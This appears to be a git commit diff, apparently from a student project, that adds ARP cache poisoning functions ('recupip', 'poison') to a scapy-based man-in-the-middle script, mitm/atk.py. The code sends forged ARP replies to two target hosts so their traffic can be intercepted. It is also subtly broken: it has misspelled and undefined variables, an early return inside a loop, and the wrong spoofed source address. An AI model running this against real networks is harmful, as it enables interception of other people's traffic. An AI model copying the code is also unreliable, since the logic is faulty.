9bbee4e84465c11c3e7c2f869d7805bc9310d1e1
Chadi-Mangle <chadimangled@gmail.com>
2023-06-05 15:59:43 +0200

    poison + recup addr mac

--- mitm/atk.py
+++ mitm/atk.py
@@ -4,6 +4,25 @@ import time as t
 import sys 
 
 
+import scapy.all
+def recupip(ip1, ip2):
+    ipcible = [ip1, ip2]
+    for i in ipcible:
+      arpmsg = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=i)
+      reponse = srp(arpmsg, timeout=2)
+      print(response[0][0][1].hswrc)
+      resultat.append(response[0][0][1].hswrc)
+      return resultat
+
+def poison(cible1, cible2, atk):
+  cible = [cible1, cible2]
+  mac = []
+  mac = recupip(cible1, cible2)
+  for i in range(2):
+    paquet = ARP(op=2, pdst=cible[i],hwdst=mac[i], psrc=atk)
+    send(paquet, verbose=False)
+  
+
 def arp(ipa ,ipb):
     paqueta = Ether()/ARP(pdst=ipb)
     sr1(paqueta)
